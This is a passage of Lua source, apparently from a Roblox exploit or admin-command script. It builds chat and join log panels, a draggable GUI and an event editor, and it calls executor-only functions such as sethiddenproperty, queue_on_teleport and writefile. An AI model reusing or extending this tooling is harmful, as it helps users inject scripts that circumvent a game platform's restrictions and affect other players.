
	chat.Name = "chat"
	chat.Parent = background
	chat.Active = true
	chat.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	chat.BorderSizePixel = 0
	chat.ClipsDescendants = true
	chat.Size = UDim2.new(0, 338, 0, 245)
	chat.ZIndex = 10
	table.insert(shade1,chat)

	Clear.Name = "Clear"
	Clear.Parent = chat
	Clear.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Clear.BorderSizePixel = 0
	Clear.Position = UDim2.new(0, 5, 0, 220)
	Clear.Size = UDim2.new(0, 50, 0, 20)
	Clear.ZIndex = 10
	Clear.Font = Enum.Font.SourceSans
	Clear.FontSize = Enum.FontSize.Size14
	Clear.Text = "Clear"
	Clear.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Clear)
	table.insert(text1,Clear)

	SaveChatlogs.Name = "SaveChatlogs"
	SaveChatlogs.Parent = chat
	SaveChatlogs.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	SaveChatlogs.BorderSizePixel = 0
	SaveChatlogs.Position = UDim2.new(0, 258, 0, 220)
	SaveChatlogs.Size = UDim2.new(0, 75, 0, 20)
	SaveChatlogs.ZIndex = 10
	SaveChatlogs.Font = Enum.Font.SourceSans
	SaveChatlogs.FontSize = Enum.FontSize.Size14
	SaveChatlogs.Text = "Save To .txt"
	SaveChatlogs.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,SaveChatlogs)
	table.insert(text1,SaveChatlogs)

	Toggle.Name = "Toggle"
	Toggle.Parent = chat
	Toggle.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Toggle.BorderSizePixel = 0
	Toggle.Position = UDim2.new(0, 60, 0, 220)
	Toggle.Size = UDim2.new(0, 66, 0, 20)
	Toggle.ZIndex = 10
	Toggle.Font = Enum.Font.SourceSans
	Toggle.FontSize = Enum.FontSize.Size14
	Toggle.Text = "Disabled"
	Toggle.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Toggle)
	table.insert(text1,Toggle)

	scroll_2.Name = "scroll"
	scroll_2.Parent = chat
	scroll_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	scroll_2.BorderSizePixel = 0
	scroll_2.Position = UDim2.new(0, 5, 0, 25)
	scroll_2.Size = UDim2.new(0, 328, 0, 190)
	scroll_2.ZIndex = 10
	scroll_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
	scroll_2.ScrollBarThickness = 8
	scroll_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	table.insert(scroll,scroll_2)
	table.insert(shade2,scroll_2)

	join.Name = "join"
	join.Parent = background
	join.Active = true
	join.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	join.BorderSizePixel = 0
	join.ClipsDescendants = true
	join.Size = UDim2.new(0, 338, 0, 245)
	join.Visible = false
	join.ZIndex = 10
	table.insert(shade1,join)

	Toggle_2.Name = "Toggle"
	Toggle_2.Parent = join
	Toggle_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Toggle_2.BorderSizePixel = 0
	Toggle_2.Position = UDim2.new(0, 60, 0, 220)
	Toggle_2.Size = UDim2.new(0, 66, 0, 20)
	Toggle_2.ZIndex = 10
	Toggle_2.Font = Enum.Font.SourceSans
	Toggle_2.FontSize = Enum.FontSize.Size14
	Toggle_2.Text = "Disabled"
	Toggle_2.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Toggle_2)
	table.insert(text1,Toggle_2)

	Clear_2.Name = "Clear"
	Clear_2.Parent = join
	Clear_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Clear_2.BorderSizePixel = 0
	Clear_2.Position = UDim2.new(0, 5, 0, 220)
	Clear_2.Size = UDim2.new(0, 50, 0, 20)
	Clear_2.ZIndex = 10
	Clear_2.Font = Enum.Font.SourceSans
	Clear_2.FontSize = Enum.FontSize.Size14
	Clear_2.Text = "Clear"
	Clear_2.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Clear_2)
	table.insert(text1,Clear_2)

	scroll_3.Name = "scroll"
	scroll_3.Parent = join
	scroll_3.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	scroll_3.BorderSizePixel = 0
	scroll_3.Position = UDim2.new(0, 5, 0, 25)
	scroll_3.Size = UDim2.new(0, 328, 0, 190)
	scroll_3.ZIndex = 10
	scroll_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
	scroll_3.ScrollBarThickness = 8
	scroll_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	table.insert(scroll,scroll_3)
	table.insert(shade2,scroll_3)

	selectChat.Name = "selectChat"
	selectChat.Parent = background
	selectChat.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	selectChat.BorderSizePixel = 0
	selectChat.Position = UDim2.new(0, 5, 0, 5)
	selectChat.Size = UDim2.new(0, 164, 0, 20)
	selectChat.ZIndex = 10
	selectChat.Font = Enum.Font.SourceSans
	selectChat.FontSize = Enum.FontSize.Size14
	selectChat.Text = "Chat Logs"
	selectChat.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,selectChat)
	table.insert(text1,selectChat)

	selectJoin.Name = "selectJoin"
	selectJoin.Parent = background
	selectJoin.BackgroundColor3 = Color3.new(0.305882, 0.305882, 0.309804)
	selectJoin.BorderSizePixel = 0
	selectJoin.Position = UDim2.new(0, 169, 0, 5)
	selectJoin.Size = UDim2.new(0, 164, 0, 20)
	selectJoin.ZIndex = 10
	selectJoin.Font = Enum.Font.SourceSans
	selectJoin.FontSize = Enum.FontSize.Size14
	selectJoin.Text = "Join Logs"
	selectJoin.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade3,selectJoin)
	table.insert(text1,selectJoin)

	function create(data)
		local insts = {}

		for i,v in pairs(data) do local a = v[1]  insts[a] = Instance.new(v[2]) end

		for _,v in pairs(data) do
			for prop,val in pairs(v[3]) do
				if type(val) == "table" then
					local a = v[1]
					local b = val[1]
					insts[a][prop] = insts[b]
				else
					local a = v[1]
					insts[a][prop] = val
				end
			end
		end

		return insts[1]
	end

	local textService = game:GetService("TextService")
	ViewportTextBox = (function()

		local funcs = {}
		funcs.Update = function(self)
			local cursorPos = self.TextBox.CursorPosition
			local text = self.TextBox.Text
			if text == "" then self.TextBox.Position = UDim2.new(0,2,0,0) return end
			if cursorPos == -1 then return end

			local cursorText = text:sub(1,cursorPos-1)
			local pos = nil
			local leftEnd = -self.TextBox.Position.X.Offset
			local rightEnd = leftEnd + self.View.AbsoluteSize.X

			local totalTextSize = textService:GetTextSize(text,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
			local cursorTextSize = textService:GetTextSize(cursorText,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X

			if cursorTextSize > rightEnd then
				pos = math.max(-2,cursorTextSize - self.View.AbsoluteSize.X + 2)
			elseif cursorTextSize < leftEnd then
				pos = math.max(-2,cursorTextSize-2)
			elseif totalTextSize < rightEnd then
				pos = math.max(-2,totalTextSize - self.View.AbsoluteSize.X + 2)
			end

			if pos then
				self.TextBox.Position = UDim2.new(0,-pos,0,0)
				self.TextBox.Size = UDim2.new(1,pos,1,0)
			end
		end

		local mt = {}
		mt.__index = funcs

		local function convert(textbox)
			local obj = setmetatable({OffsetX = 0, TextBox = textbox},mt)

			local view = Instance.new("Frame")
			view.BackgroundTransparency = textbox.BackgroundTransparency
			view.BackgroundColor3 = textbox.BackgroundColor3
			view.BorderSizePixel = textbox.BorderSizePixel
			view.BorderColor3 = textbox.BorderColor3
			view.Position = textbox.Position
			view.Size = textbox.Size
			view.ClipsDescendants = true
			view.Name = textbox.Name
			view.ZIndex = 10
			textbox.BackgroundTransparency = 1
			textbox.Position = UDim2.new(0,4,0,0)
			textbox.Size = UDim2.new(1,-8,1,0)
			textbox.TextXAlignment = Enum.TextXAlignment.Left
			textbox.Name = "Input"
			table.insert(text1,textbox)
			table.insert(shade2,view)

			obj.View = view

			textbox.Changed:Connect(function(prop)
				if prop == "Text" or prop == "CursorPosition" or prop == "AbsoluteSize" then
					obj:Update()
				end
			end)

			obj:Update()

			view.Parent = textbox.Parent
			textbox.Parent = view

			return obj
		end

		return {convert = convert}
	end)()

	ViewportTextBox.convert(Cmdbar).View.ZIndex = 10
	ViewportTextBox.convert(Cmdbar_2).View.ZIndex = 10
	ViewportTextBox.convert(Cmdbar_3).View.ZIndex = 10

	IYMouse = Players.LocalPlayer:GetMouse()
	UserInputService = game:GetService("UserInputService")
	TweenService = game:GetService("TweenService")
	HttpService = game:GetService("HttpService")
	MarketplaceService = game:GetService("MarketplaceService")
	RunService = game:GetService("RunService")
	TeleportService = game:GetService("TeleportService")
	StarterGui = game:GetService("StarterGui")
	GuiService = game:GetService("GuiService")
	Lighting = game:GetService("Lighting")
	ContextActionService = game:GetService("ContextActionService")
	NetworkClient = game:GetService("NetworkClient")
	ReplicatedStorage = game:GetService("ReplicatedStorage")
	GroupService = game:GetService("GroupService")
	PathService = game:GetService("PathfindingService")
	SoundService = game:GetService("SoundService")
	Teams = game:GetService("Teams")
	StarterPlayer = game:GetService("StarterPlayer")
	InsertService = game:GetService("InsertService")
	ChatService = game:GetService("Chat")
	ProximityPromptService = game:GetService("ProximityPromptService")
	StatsService = game:GetService("Stats")
	MaterialService = game:GetService("MaterialService")

	sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
	gethidden = gethiddenproperty or get_hidden_property or get_hidden_prop
	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
	PlaceId, JobId = game.PlaceId, game.JobId


	function writefileExploit()
		if writefile then
			return true
		end
	end

	function isNumber(str)
		if tonumber(str) ~= nil or str == 'inf' then
			return true
		end
	end

	function getRoot(char)
		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
		return rootPart
	end

	function tools(plr)
		if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
			return true
		end
	end

	function r15(plr)
		if plr.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
			return true
		end
	end

	function toClipboard(String)
		local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
		if clipBoard then
			clipBoard(String)
			notify('Clipboard','Copied to clipboard')
		else
			notify('Clipboard',"Your exploit doesn't have the ability to use the clipboard")
		end
	end

	function getHierarchy(obj)
		local fullname
		local period

		if string.find(obj.Name,' ') then
			fullname = '["'..obj.Name..'"]'
			period = false
		else
			fullname = obj.Name
			period = true
		end

		local getS = obj
		local parent = obj
		local service = ''

		if getS.Parent ~= game then
			repeat
				getS = getS.Parent
				service = getS.ClassName
			until getS.Parent == game
		end

		if parent.Parent ~= getS then
			repeat
				parent = parent.Parent
				if string.find(tostring(parent),' ') then
					if period then
						fullname = '["'..parent.Name..'"].'..fullname
					else
						fullname = '["'..parent.Name..'"]'..fullname
					end
					period = false
				else
					if period then
						fullname = parent.Name..'.'..fullname
					else
						fullname = parent.Name..''..fullname
					end
					period = true
				end
			until parent.Parent == getS
		elseif string.find(tostring(parent),' ') then
			fullname = '["'..parent.Name..'"]'
			period = false
		end

		if period then
			return 'game:GetService("'..service..'").'..fullname
		else
			return 'game:GetService("'..service..'")'..fullname
		end
	end

	AllWaypoints = {}

	local cooldown = false
	function writefileCooldown(name,data)
		task.spawn(function()
			if not cooldown then
				cooldown = true
				writefile(name, data)
			else
				repeat wait() until cooldown == false
				writefileCooldown(name,data)
			end
			wait(3)
			cooldown = false
		end)
	end

	function dragGUI(gui)
		task.spawn(function()
			local dragging
			local dragInput
			local dragStart = Vector3.new(0,0,0)
			local startPos
			local function update(input)
				local delta = input.Position - dragStart
				local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
			end
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end)
	end

	dragGUI(logs)
	dragGUI(KeybindEditor)
	dragGUI(PluginEditor)
	dragGUI(ToPartFrame)

	eventEditor = (function()
		local events = {}

		local function registerEvent(name,sets)
			events[name] = {
				commands = {},
				sets = sets or {}
			}
		end

		local onEdited = nil

		local function fireEvent(name,...)
			local args = {...}
			local event = events[name]
			if event then
				for i,cmd in pairs(event.commands) do
					local metCondition = true
					for idx,set in pairs(event.sets) do
						local argVal = args[idx]
						local cmdSet = cmd[2][idx]
						local condType = set.Type
						if condType == "Player" then
							if cmdSet == 0 then
								metCondition = metCondition and (tostring(Players.LocalPlayer) == argVal)
							elseif cmdSet ~= 1 then
								metCondition = metCondition and table.find(getPlayer(cmdSet,Players.LocalPlayer),argVal)
							end
						elseif condType == "String" then
							if cmdSet ~= 0 then
								metCondition = metCondition and string.find(argVal:lower(),cmdSet:lower())
							end
						elseif condType == "Number" then
							if cmdSet ~= 0 then
								metCondition = metCondition and tonumber(argVal)<=tonumber(cmdSet)
							end
						end
						if not metCondition then break end
					end

					if metCondition then
						pcall(task.spawn(function()
							local cmdStr = cmd[1]
							for count,arg in pairs(args) do
								cmdStr = cmdStr:gsub("%$"..count,arg)
							end
							wait(cmd[3] or 0)
							execCmd(cmdStr)
						end))
					end
				end
			end
		end

		local main = create({
			{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderSizePixel=0,Name="EventEditor",Position=UDim2.new(0.5,-175,0,-500),Size=UDim2.new(0,350,0,20),ZIndex=10,}},
			{2,"Frame",{BackgroundColor3=currentShade2,BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0.95,0),Text="Event Editor",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=Enum.TextXAlignment.Center,ZIndex=10,}},
			{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
			{6,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,202),ZIndex=10,}},
			{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={6},Position=UDim2.new(0,5,0,5),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,-10,1,-10),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
			{8,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={7},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{9,"UIListLayout",{Parent={8},SortOrder=2,}},
			{10,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,ClipsDescendants=true,Name="Settings",Parent={6},Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,150,1,0),ZIndex=10,}},
			{11,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),Name="Slider",Parent={10},Position=UDim2.new(0,-150,0,0),Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{12,"Frame",{BackgroundColor3=Color3.new(0.23529413342476,0.23529413342476,0.23529413342476),BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,Name="Line",Parent={11},Size=UDim2.new(0,1,1,0),ZIndex=10,}},
			{13,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={11},Position=UDim2.new(0,0,0,25),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,-25),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
			{14,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={13},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{15,"UIListLayout",{Parent={14},SortOrder=2,}},
			{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={11},Size=UDim2.new(1,0,0,20),Text="Event Settings",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{17,"TextButton",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Font=3,Name="Close",BorderSizePixel=0,Parent={11},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="<",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{18,"Folder",{Name="Templates",Parent={10},}},
			{19,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Players",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,86),Visible=false,ZIndex=10,}},
			{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={19},Size=UDim2.new(1,0,0,20),Text="Choose Players",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{21,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={19},Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-10,0,20),Text="Any Player",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{22,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={21},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{23,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={22},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{24,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Me",Parent={19},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Me Only",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{25,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={24},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{26,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={25},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{27,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={19},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Custom Player Set",Position=UDim2.new(0,5,0,64),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{28,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={19},Position=UDim2.new(1,-25,0,64),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{29,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={28},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{30,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Strings",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
			{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={30},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{32,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={30},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any String",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{33,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={32},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{34,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={33},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{54,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Numbers",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
			{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={54},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{56,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={54},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any Number",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{57,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={56},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{58,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={57},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{59,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={54},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Number",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{60,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={54},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{61,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={60},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{35,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={30},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Match String",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{36,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={30},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{37,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={36},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{38,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="DelayEditor",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,24),Visible=false,ZIndex=10,}},
			{39,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Font=3,Name="Secs",Parent={38},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),Position=UDim2.new(0,60,0,2),Size=UDim2.new(1,-65,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{40,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Label",Parent={39},Position=UDim2.new(0,-55,0,0),Size=UDim2.new(1,0,1,0),Text="Delay (s):",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{41,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="EventTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
			{42,"TextButton",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="Expand",Parent={41},Size=UDim2.new(0,20,0,20),Text=">",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{43,"TextLabel",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="EventName",Parent={41},Position=UDim2.new(0,25,0,0),Size=UDim2.new(1,-25,0,20),Text="OnSpawn",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{44,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BorderSizePixel=0,BackgroundTransparency=1,ClipsDescendants=true,Name="Cmds",Parent={41},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
